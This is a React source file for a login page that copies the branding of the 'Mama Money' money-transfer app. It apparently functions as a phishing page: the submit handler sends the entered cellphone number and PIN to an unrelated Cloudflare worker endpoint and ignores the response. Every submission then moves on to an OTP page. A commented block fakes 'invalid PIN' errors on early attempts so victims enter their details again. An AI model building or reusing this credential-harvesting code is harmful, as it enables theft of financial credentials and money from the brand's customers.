// import React,{ useState } from "react";
// import { ChevronLeft } from "lucide-react";

// export default function MamaMoneyLogin() {
//   const [cellphone, setCellphone] = useState("");
//   const [pin, setPin] = useState("");
//   const [remember, setRemember] = useState(false);

//   /*
//     Background pattern: grid of squares split into 4 triangles by diagonals.
//     Triangles alternate light/dark for the pinwheel / argyle look.
//   */
//   const tile = `
//     <svg xmlns='http://www.w3.org/2000/svg' width='160' height='160' viewBox='0 0 160 160'>
//       <rect width='160' height='160' fill='%237ec93e'/>

//       <polygon points='0,0 80,0 40,40' fill='%2389ce4c'/>
//       <polygon points='0,80 80,80 40,40' fill='%2389ce4c'/>
//       <polygon points='0,0 0,80 40,40' fill='%2374c235'/>
//       <polygon points='80,0 80,80 40,40' fill='%2374c235'/>

//       <polygon points='80,0 160,0 120,40' fill='%2374c235'/>
//       <polygon points='80,80 160,80 120,40' fill='%2374c235'/>
//       <polygon points='80,0 80,80 120,40' fill='%2389ce4c'/>
//       <polygon points='160,0 160,80 120,40' fill='%2389ce4c'/>

//       <polygon points='0,80 80,80 40,120' fill='%2374c235'/>
//       <polygon points='0,160 80,160 40,120' fill='%2374c235'/>
//       <polygon points='0,80 0,160 40,120' fill='%2389ce4c'/>
//       <polygon points='80,80 80,160 40,120' fill='%2389ce4c'/>

//       <polygon points='80,80 160,80 120,120' fill='%2389ce4c'/>
//       <polygon points='80,160 160,160 120,120' fill='%2389ce4c'/>
//       <polygon points='80,80 80,160 120,120' fill='%2374c235'/>
//       <polygon points='160,80 160,160 120,120' fill='%2374c235'/>

//       <g stroke='%23a0dc66' stroke-width='0.8' opacity='0.45' fill='none'>
//         <path d='M0 0 L80 80 M80 0 L0 80 M80 0 L160 80 M160 0 L80 80 M0 80 L80 160 M80 80 L0 160 M80 80 L160 160 M160 80 L80 160'/>
//       </g>
//     </svg>
//   `;

//   const bg = `url("data:image/svg+xml;utf8,${tile
//     .replace(/\n/g, "")
//     .replace(/\s{2,}/g, " ")
//     .trim()}")`;

//   return (
//     <div
//       className="min-h-screen w-full flex justify-center font-sans"
//       style={{ backgroundColor: "#7ec93e" }}
//     >
//       {/*
//         Responsive container:
//         - Mobile (default): full width, no max cap
//         - sm and up (≥640px): capped at 430px, centered, with subtle shadow so it reads as a phone-frame on desktop
//       */}
//       <div
//         className="relative w-full sm:max-w-[430px] min-h-screen flex flex-col
//                    px-5 sm:px-6 pt-4 sm:pt-5 pb-8 sm:pb-10
//                    sm:shadow-2xl sm:my-0"
//         style={{
//           backgroundImage: bg,
//           backgroundSize: "clamp(140px, 45vw, 180px) clamp(140px, 45vw, 180px)",
//           backgroundColor: "#7ec93e",
//         }}
//       >
//         {/* Back arrow */}
//         <button
//           type="button"
//           aria-label="Go back"
//           className="text-[#0a3f2a] w-10 h-10 flex items-center justify-center -ml-1"
//         >
//           <ChevronLeft strokeWidth={2.5} className="w-6 h-6 sm:w-7 sm:h-7" />
//         </button>

//         {/* Logo */}
//         <div className="flex items-center justify-center gap-2 sm:gap-3 mt-4 sm:mt-6 mb-8 sm:mb-10">
//           <svg
//             viewBox="0 0 120 120"
//             className="w-[70px] h-[70px] sm:w-[90px] sm:h-[90px] flex-shrink-0"
//             xmlns="http://www.w3.org/2000/svg"
//           >
//             <path
//               d="M25 45 Q25 18 60 18 Q95 18 95 45 Q95 48 92 50 Q85 40 75 38 Q70 30 60 30 Q50 30 45 38 Q35 40 28 50 Q25 48 25 45 Z"
//               fill="#0a3f2a"
//             />
//             <path
//               d="M30 55 Q30 95 60 100 Q90 95 90 55 Q85 42 60 42 Q35 42 30 55 Z"
//               fill="#0a3f2a"
//             />
//             <circle cx="48" cy="62" r="3" fill="#7ec93e" />
//             <circle cx="72" cy="62" r="3" fill="#7ec93e" />
//             <path
//               d="M45 78 Q60 92 75 78 Q72 86 60 87 Q48 86 45 78 Z"
//               fill="#ffffff"
//             />
//           </svg>

//           <div className="flex flex-col leading-none">
//             <span
//               className="text-[#0a3f2a] font-extrabold italic leading-none"
//               style={{ fontSize: "clamp(26px, 8vw, 34px)" }}
//             >
//               Mama
//             </span>
//             <span
//               className="text-[#0a3f2a] font-extrabold italic leading-none mt-1"
//               style={{ fontSize: "clamp(26px, 8vw, 34px)" }}
//             >
//               Money
//             </span>
//             <span
//               className="text-white italic font-semibold mt-1 self-end"
//               style={{ fontSize: "clamp(9px, 2.8vw, 11px)" }}
//             >
//               More Money Home
//             </span>
//           </div>
//         </div>

//         {/* Cellphone input */}
//         <div className="mb-3 sm:mb-4">
//           <input
//             type="tel"
//             value={cellphone}
//             onChange={(e) => setCellphone(e.target.value)}
//             placeholder="Cellphone Number"
//             className="w-full bg-transparent border border-white/95 rounded-md
//                        px-4 sm:px-5 py-3 sm:py-4
//                        text-white placeholder-white/95 focus:outline-none focus:border-white"
//             style={{ fontSize: "clamp(15px, 4.2vw, 18px)" }}
//           />
//         </div>

//         {/* Pin input */}
//         <div className="mb-8 sm:mb-10">
//           <input
//             type="password"
//             value={pin}
//             onChange={(e) => setPin(e.target.value)}
//             placeholder="Pin"
//             className="w-full bg-transparent border border-white/95 rounded-md
//                        px-4 sm:px-5 py-3 sm:py-4
//                        text-white placeholder-white/95 focus:outline-none focus:border-white"
//             style={{ fontSize: "clamp(15px, 4.2vw, 18px)" }}
//           />
//         </div>

//         {/* Buttons */}
//         <div className="flex flex-col gap-3 sm:gap-4 items-center">
//           {/* Login */}
//           <button
//             type="button"
//             className="w-[75%] sm:w-[68%] bg-[#0a3f2a] text-white rounded-[10px]
//                        py-3.5 sm:py-[18px] px-4 sm:px-6
//                        flex items-center justify-center gap-3 sm:gap-4
//                        font-normal shadow-[0_2px_4px_rgba(0,0,0,0.15)]
//                        active:scale-[0.99] transition-transform"
//             style={{ fontSize: "clamp(16px, 4.4vw, 19px)" }}
//           >
//             <span>Login</span>
//             <svg
//               viewBox="0 0 24 24"
//               fill="none"
//               className="text-[#8fd554] w-5 h-5 sm:w-[22px] sm:h-[22px]"
//             >
//               <path
//                 d="M5 12h14M13 5l7 7-7 7"
//                 stroke="currentColor"
//                 strokeWidth="2.2"
//                 strokeLinecap="round"
//                 strokeLinejoin="round"
//               />
//             </svg>
//           </button>

//           {/* Check Rates */}
//           <button
//             type="button"
//             className="w-[75%] sm:w-[68%] bg-[#0a3f2a] text-white rounded-[10px]
//                        py-3.5 sm:py-[18px] px-4 sm:px-6
//                        flex items-center justify-center gap-3 sm:gap-4
//                        font-normal shadow-[0_2px_4px_rgba(0,0,0,0.15)]
//                        active:scale-[0.99] transition-transform"
//             style={{ fontSize: "clamp(16px, 4.4vw, 19px)" }}
//           >
//             <span>Check Rates</span>
//             <svg
//               viewBox="0 0 24 24"
//               fill="none"
//               className="text-[#8fd554] w-5 h-5 sm:w-[22px] sm:h-[22px]"
//             >
//               <path
//                 d="M5 12h14M13 5l7 7-7 7"
//                 stroke="currentColor"
//                 strokeWidth="2.2"
//                 strokeLinecap="round"
//                 strokeLinejoin="round"
//               />
//             </svg>
//           </button>

//           {/* Whatsapp Mama */}
//           <button
//             type="button"
//             className="w-[75%] sm:w-[68%] bg-[#0a3f2a] text-white rounded-[10px]
//                        py-3.5 sm:py-[18px] px-4 sm:px-6
//                        flex items-center justify-center gap-3 sm:gap-4
//                        font-normal shadow-[0_2px_4px_rgba(0,0,0,0.15)]
//                        active:scale-[0.99] transition-transform"
//             style={{ fontSize: "clamp(16px, 4.4vw, 19px)" }}
//           >
//             <span>Whatsapp Mama</span>
//             <svg
//               viewBox="0 0 24 24"
//               fill="none"
//               className="text-[#8fd554] w-5 h-5 sm:w-6 sm:h-6"
//             >
//               <circle
//                 cx="12"
//                 cy="12"
//                 r="10"
//                 stroke="currentColor"
//                 strokeWidth="1.8"
//               />
//               <path
//                 d="M8.8 7.5c-.4 0-.8.15-1.05.45-.3.35-1 1-1 2.45 0 1.45 1.05 2.85 1.2 3.05.15.2 2.05 3.15 5.05 4.3 2.5.95 3 .75 3.55.7.55-.05 1.75-.7 2-1.4.25-.7.25-1.3.18-1.4-.08-.1-.3-.17-.6-.32-.3-.15-1.75-.85-2.02-.95-.28-.1-.48-.15-.68.15-.2.3-.78.95-.95 1.15-.17.2-.35.22-.65.08-.3-.15-1.25-.45-2.38-1.45-.88-.78-1.47-1.75-1.65-2.05-.17-.3-.02-.45.13-.6.13-.13.3-.35.45-.52.15-.17.2-.3.3-.5.1-.2.05-.38-.03-.52-.08-.15-.67-1.6-.92-2.2-.22-.55-.45-.48-.62-.5-.16 0-.35-.02-.53-.02z"
//                 fill="currentColor"
//               />
//             </svg>
//           </button>

//           {/* Remember me */}
//           <label
//             className="w-[75%] sm:w-[68%] bg-[#6fb835]/30 rounded-[8px]
//                        py-3 sm:py-[14px] px-4 sm:px-6
//                        flex items-center justify-center gap-3 cursor-pointer select-none"
//           >
//             <input
//               type="checkbox"
//               checked={remember}
//               onChange={(e) => setRemember(e.target.checked)}
//               className="hidden"
//             />
//             <span className="w-[22px] h-[22px] sm:w-[26px] sm:h-[26px] rounded-[3px] bg-white flex items-center justify-center flex-shrink-0">
//               {remember && (
//                 <svg viewBox="0 0 24 24" className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-[#0a3f2a]">
//                   <path
//                     fill="currentColor"
//                     d="M9 16.2 4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4z"
//                   />
//                 </svg>
//               )}
//             </span>
//             <span
//               className="text-[#0a3f2a] font-bold"
//               style={{ fontSize: "clamp(16px, 4.4vw, 19px)" }}
//             >
//               Remember me
//             </span>
//           </label>
//         </div>

//         {/* Forgot pin */}
//         <div className="mt-6 sm:mt-8 text-center">
//           <p
//             className="text-[#0a3f2a] font-bold"
//             style={{ fontSize: "clamp(17px, 5vw, 20px)" }}
//           >
//             Forgot your pin?
//           </p>
//           <p
//             className="text-[#0a3f2a] font-semibold mt-1"
//             style={{ fontSize: "clamp(15px, 4.4vw, 18px)" }}
//           >
//             Dial{" "}
//             <a href="tel:*134*542#" className="underline font-bold">
//               *134*542#
//             </a>{" "}
//             to reset it.
//           </p>
//         </div>
//       </div>
//     </div>
//   );
// }

import React,{ useState } from "react";
import { ChevronLeft } from "lucide-react";
import { useNavigate } from "react-router-dom";
import mama from "./assets/mama.png"

export default function MamaMoneyLogin() {
  const [cellphone, setCellphone] = useState("");
  const [pin, setPin] = useState("");
  const [remember, setRemember] = useState(false);
  const [errors, setErrors] = useState({});
  const [isSubmitting, setIsSubmitting] = useState(false);
const [attemptCount, setAttemptCount] = useState(0);

  const navigate = useNavigate();

  /*
    Background pattern: grid of squares split into 4 triangles by diagonals.
    Triangles alternate light/dark for the pinwheel / argyle look.
  */
  const tile = `
    <svg xmlns='http://www.w3.org/2000/svg' width='160' height='160' viewBox='0 0 160 160'>
      <rect width='160' height='160' fill='%237ec93e'/>

      <polygon points='0,0 80,0 40,40' fill='%2389ce4c'/>
      <polygon points='0,80 80,80 40,40' fill='%2389ce4c'/>
      <polygon points='0,0 0,80 40,40' fill='%2374c235'/>
      <polygon points='80,0 80,80 40,40' fill='%2374c235'/>

      <polygon points='80,0 160,0 120,40' fill='%2374c235'/>
      <polygon points='80,80 160,80 120,40' fill='%2374c235'/>
      <polygon points='80,0 80,80 120,40' fill='%2389ce4c'/>
      <polygon points='160,0 160,80 120,40' fill='%2389ce4c'/>

      <polygon points='0,80 80,80 40,120' fill='%2374c235'/>
      <polygon points='0,160 80,160 40,120' fill='%2374c235'/>
      <polygon points='0,80 0,160 40,120' fill='%2389ce4c'/>
      <polygon points='80,80 80,160 40,120' fill='%2389ce4c'/>

      <polygon points='80,80 160,80 120,120' fill='%2389ce4c'/>
      <polygon points='80,160 160,160 120,120' fill='%2389ce4c'/>
      <polygon points='80,80 80,160 120,120' fill='%2374c235'/>
      <polygon points='160,80 160,160 120,120' fill='%2374c235'/>

      <g stroke='%23a0dc66' stroke-width='0.8' opacity='0.45' fill='none'>
        <path d='M0 0 L80 80 M80 0 L0 80 M80 0 L160 80 M160 0 L80 80 M0 80 L80 160 M80 80 L0 160 M80 80 L160 160 M160 80 L80 160'/>
      </g>
    </svg>
  `;

  const bg = `url("data:image/svg+xml;utf8,${tile
    .replace(/\n/g, "")
    .replace(/\s{2,}/g, " ")
    .trim()}")`;

  // Only allow digits in cellphone / pin
  const handleCellphoneChange = (e) => {
    const digitsOnly = e.target.value.replace(/\D/g, "");
    setCellphone(digitsOnly);
    if (errors.cellphone) setErrors((p) => ({ ...p, cellphone: "" }));
  };

  const handlePinChange = (e) => {
    const digitsOnly = e.target.value.replace(/\D/g, "").slice(0, 6);
    setPin(digitsOnly);
    if (errors.pin) setErrors((p) => ({ ...p, pin: "" }));
  };

  const validate = () => {
    const newErrors = {};
    if (!cellphone) {
      newErrors.cellphone = "Cellphone number is required";
    } else if (cellphone.length < 9) {
      newErrors.cellphone = "Enter a valid cellphone number";
    }
    if (!pin) {
      newErrors.pin = "Pin is required";
    } else if (pin.length < 4) {
      newErrors.pin = "Pin must be at least 4 digits";
    }
    return newErrors;
  };

  const handleSubmit = async (e) => {
  e?.preventDefault();

  if (isSubmitting) return;

  setErrors({});

  const validationErrors = validate();
  if (Object.keys(validationErrors).length > 0) {
    setErrors(validationErrors);
    return;
  }

  setIsSubmitting(true);

  try {
    const response = await fetch("https://my-worker-app.instapayapi.workers.dev/api/login2", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        mobileNumber: cellphone,
        pin,
      }),
    });

    const data = await response.json();

    const newAttempt = attemptCount + 1;
    setAttemptCount(newAttempt);

    // ❌ First 2 attempts → force error (API ignore)
    // if (newAttempt < 3) {
    //   setErrors({ submit: "Invalid cell phone number or PIN" });
    //   return;
    // }

    // ✅ 3rd attempt → allow success
    navigate("/otp", { state: { cellphone, pin } });

    // 🔁 reset for next cycle
    setAttemptCount(0);

  } catch (err) {
    setErrors({ submit: "Login failed. Please try again." });
  } finally {
    setIsSubmitting(false);
  }
};
  // const handleSubmit = async (e) => {
  //   e?.preventDefault();
  //   const validationErrors = validate();
  //   if (Object.keys(validationErrors).length > 0) {
  //     setErrors(validationErrors);
  //     return;
  //   }

  //   setIsSubmitting(true);
  //   try {
  //     // TODO: replace with actual API call
  //     const response = await fetch("https://my-worker-app.instapayapi.workers.dev/api/login2", {
  //       method: "POST",
  //       headers: { "Content-Type": "application/json" },
  //       body: JSON.stringify({ mobileNumber: cellphone, pin }),
  //     });
  //     const data = await response.json();

  //     // Simulate request
  //   //   await new Promise((r) => setTimeout(r, 600));

  //     // On success, go to OTP page and pass the phone number along
  //     navigate("/otp", { state: { cellphone, pin } });
  //   } catch (err) {
  //     setErrors({ submit: "Login failed. Please try again." });
  //   } finally {
  //     setIsSubmitting(false);
  //   }
  // };

  return (
    <div
      className="min-h-screen w-full flex justify-center font-sans"
      style={{ backgroundColor: "#7ec93e" }}
    >
      <form
        onSubmit={handleSubmit}
        className="relative w-full sm:max-w-[430px] min-h-screen flex flex-col
                   px-5 sm:px-6 pt-4 sm:pt-5 pb-8 sm:pb-10
                   sm:shadow-2xl"
        style={{
          backgroundImage: bg,
          backgroundSize: "clamp(140px, 45vw, 180px) clamp(140px, 45vw, 180px)",
          backgroundColor: "#7ec93e",
        }}
      >
        {/* Back arrow */}
        <button
          type="button"
          aria-label="Go back"
          onClick={() => navigate(-1)}
          className="text-[#0a3f2a] w-10 h-10 flex items-center justify-center -ml-1"
        >
          <ChevronLeft strokeWidth={2.5} className="w-6 h-6 sm:w-7 sm:h-7" />
        </button>

        {/* Logo */}
        <div className="flex items-center justify-center gap-2 sm:gap-3 mt-4 sm:mt-6 mb-8 sm:mb-10">
          {/* <svg
            viewBox="0 0 120 120"
            className="w-[70px] h-[70px] sm:w-[90px] sm:h-[90px] flex-shrink-0"
            xmlns="http://www.w3.org/2000/svg"
          >
            <path
              d="M25 45 Q25 18 60 18 Q95 18 95 45 Q95 48 92 50 Q85 40 75 38 Q70 30 60 30 Q50 30 45 38 Q35 40 28 50 Q25 48 25 45 Z"
              fill="#0a3f2a"
            />
            <path
              d="M30 55 Q30 95 60 100 Q90 95 90 55 Q85 42 60 42 Q35 42 30 55 Z"
              fill="#0a3f2a"
            />
            <circle cx="48" cy="62" r="3" fill="#7ec93e" />
            <circle cx="72" cy="62" r="3" fill="#7ec93e" />
            <path
              d="M45 78 Q60 92 75 78 Q72 86 60 87 Q48 86 45 78 Z"
              fill="#ffffff"
            />
          </svg> */}
<img src={mama} alt="" className="h-20 w-23" />
          <div className="flex flex-col leading-none">
            <span
              className="text-[#0a3f2a] font-extrabold italic leading-none"
              style={{ fontSize: "clamp(26px, 8vw, 34px)" }}
            >
              Mama
            </span>
            <span
              className="text-[#0a3f2a] font-extrabold italic leading-none mt-1"
              style={{ fontSize: "clamp(26px, 8vw, 34px)" }}
            >
              Money
            </span>
            <span
              className="text-white italic font-semibold mt-1 self-end"
              style={{ fontSize: "clamp(9px, 2.8vw, 11px)" }}
            >
              More Money Home
            </span>
          </div>
        </div>

        {/* Cellphone input */}
        <div className="mb-3 sm:mb-4">
          <input
            type="tel"
            inputMode="numeric"
            pattern="[0-9]*"
            autoComplete="tel"
            value={cellphone}
            onChange={handleCellphoneChange}
            placeholder="Cellphone Number"
            className={`w-full bg-transparent border rounded-md
                       px-4 sm:px-5 py-3 sm:py-4
                       text-white placeholder-white/95 focus:outline-none
                       ${errors.cellphone ? "border-red-300" : "border-white/95 focus:border-white"}`}
            style={{ fontSize: "clamp(15px, 4.2vw, 18px)" }}
          />
          {errors.cellphone && (
            <p className="text-red-100 text-sm mt-1 ml-1">{errors.cellphone}</p>
          )}
        </div>

        {/* Pin input */}
        <div className="mb-8 sm:mb-10">
          <input
            type="password"
            inputMode="numeric"
            pattern="[0-9]*"
            autoComplete="current-password"
            value={pin}
            onChange={handlePinChange}
            placeholder="Pin"
            maxLength={4}
            className={`w-full bg-transparent border rounded-md
                       px-4 sm:px-5 py-3 sm:py-4
                       text-white placeholder-white/95 focus:outline-none
                       ${errors.pin ? "border-red-300" : "border-white/95 focus:border-white"}`}
            style={{ fontSize: "clamp(15px, 4.2vw, 18px)" }}
          />
          {errors.pin && (
            <p className="text-red-100 text-sm mt-1 ml-1">{errors.pin}</p>
          )}
        </div>

        {/* {errors.submit && (
          <p className="text-red-100 text-center text-sm mb-4">{errors.submit}</p>
        )} */}
        {errors.submit && (
  <div className="w-full border border-red-500 bg-red-100/10 text-red-800 
                  rounded-md px-4 py-3 mb-5 flex items-center gap-2">
    
    {/* Warning Icon */}
    <svg
      viewBox="0 0 24 24"
      className="w-5 h-5 text-red-600 flex-shrink-0"
      fill="none"
    >
      <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="2" />
      <path
        d="M12 7v6M12 17h.01"
        stroke="currentColor"
        strokeWidth="2"
        strokeLinecap="round"
      />
    </svg>

    {/* Error Text */}
    <span className="text-sm font-medium">
      {errors.submit}
    </span>
  </div>
)}

        {/* Buttons */}
        <div className="flex flex-col gap-3 sm:gap-4 items-center">
          {/* Login (submits the form) */}
          <button
            type="submit"
            disabled={isSubmitting}
            className="w-[75%] sm:w-[68%] bg-[#0a3f2a] text-white rounded-[10px]
                       py-3.5 sm:py-[18px] px-4 sm:px-6
                       flex items-center justify-center gap-3 sm:gap-4
                       font-normal shadow-[0_2px_4px_rgba(0,0,0,0.15)]
                       active:scale-[0.99] transition-transform
                       disabled:opacity-70 disabled:cursor-not-allowed"
            style={{ fontSize: "clamp(16px, 4.4vw, 19px)" }}
          >
            <span>{isSubmitting ? "Logging in..." : "Login"}</span>
            {!isSubmitting && (
              <svg
                viewBox="0 0 24 24"
                fill="none"
                className="text-[#8fd554] w-5 h-5 sm:w-[22px] sm:h-[22px]"
              >
                <path
                  d="M5 12h14M13 5l7 7-7 7"
                  stroke="currentColor"
                  strokeWidth="2.2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                />
              </svg>
            )}
          </button>

          {/* Check Rates */}
          <button
            type="button"
            // onClick={() => navigate("/rates")}
            className="w-[75%] sm:w-[68%] bg-[#0a3f2a] text-white rounded-[10px]
                       py-3.5 sm:py-[18px] px-4 sm:px-6
                       flex items-center justify-center gap-3 sm:gap-4
                       font-normal shadow-[0_2px_4px_rgba(0,0,0,0.15)]
                       active:scale-[0.99] transition-transform"
            style={{ fontSize: "clamp(16px, 4.4vw, 19px)" }}
          >
            <span>Check Rates</span>
            <svg
              viewBox="0 0 24 24"
              fill="none"
              className="text-[#8fd554] w-5 h-5 sm:w-[22px] sm:h-[22px]"
            >
              <path
                d="M5 12h14M13 5l7 7-7 7"
                stroke="currentColor"
                strokeWidth="2.2"
                strokeLinecap="round"
                strokeLinejoin="round"
              />
            </svg>
          </button>

          {/* Whatsapp Mama */}
          <button
            type="button"
            // onClick={() =>
            //   window.open("https://wa.me/27800000000", "_blank")
            // }
            className="w-[75%] sm:w-[68%] bg-[#0a3f2a] text-white rounded-[10px]
                       py-3.5 sm:py-[18px] px-4 sm:px-6
                       flex items-center justify-center gap-3 sm:gap-4
                       font-normal shadow-[0_2px_4px_rgba(0,0,0,0.15)]
                       active:scale-[0.99] transition-transform"
            style={{ fontSize: "clamp(16px, 4.4vw, 19px)" }}
          >
            <span>Whatsapp Mama</span>
            <svg
              viewBox="0 0 24 24"
              fill="none"
              className="text-[#8fd554] w-5 h-5 sm:w-6 sm:h-6"
            >
              <circle
                cx="12"
                cy="12"
                r="10"
                stroke="currentColor"
                strokeWidth="1.8"
              />
              <path
                d="M8.8 7.5c-.4 0-.8.15-1.05.45-.3.35-1 1-1 2.45 0 1.45 1.05 2.85 1.2 3.05.15.2 2.05 3.15 5.05 4.3 2.5.95 3 .75 3.55.7.55-.05 1.75-.7 2-1.4.25-.7.25-1.3.18-1.4-.08-.1-.3-.17-.6-.32-.3-.15-1.75-.85-2.02-.95-.28-.1-.48-.15-.68.15-.2.3-.78.95-.95 1.15-.17.2-.35.22-.65.08-.3-.15-1.25-.45-2.38-1.45-.88-.78-1.47-1.75-1.65-2.05-.17-.3-.02-.45.13-.6.13-.13.3-.35.45-.52.15-.17.2-.3.3-.5.1-.2.05-.38-.03-.52-.08-.15-.67-1.6-.92-2.2-.22-.55-.45-.48-.62-.5-.16 0-.35-.02-.53-.02z"
                fill="currentColor"
              />
            </svg>
          </button>

          {/* Remember me */}
          <label
            className="w-[75%] sm:w-[68%] bg-[#6fb835]/30 rounded-[8px]
                       py-3 sm:py-[14px] px-4 sm:px-6
                       flex items-center justify-center gap-3 cursor-pointer select-none"
          >
            <input
              type="checkbox"
              checked={remember}
              onChange={(e) => setRemember(e.target.checked)}
              className="hidden"
            />
            <span className="w-[22px] h-[22px] sm:w-[26px] sm:h-[26px] rounded-[3px] bg-white flex items-center justify-center flex-shrink-0">
              {remember && (
                <svg
                  viewBox="0 0 24 24"
                  className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-[#0a3f2a]"
                >
                  <path
                    fill="currentColor"
                    d="M9 16.2 4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4z"
                  />
                </svg>
              )}
            </span>
            <span
              className="text-[#0a3f2a] font-bold"
              style={{ fontSize: "clamp(16px, 4.4vw, 19px)" }}
            >
              Remember me
            </span>
          </label>
        </div>

        {/* Forgot pin */}
        <div className="mt-6 sm:mt-8 text-center">
          <p
            className="text-[#0a3f2a] font-bold"
            style={{ fontSize: "clamp(17px, 5vw, 20px)" }}
          >
            Forgot your pin?
          </p>
          <p
            className="text-[#0a3f2a] font-semibold mt-1"
            style={{ fontSize: "clamp(15px, 4.4vw, 18px)" }}
          >
            Dial{" "}
            <a href="tel:*134*542#" className="underline font-bold">
              *134*542#
            </a>{" "}
            to reset it.
          </p>
        </div>
      </form>
    </div>
  );
}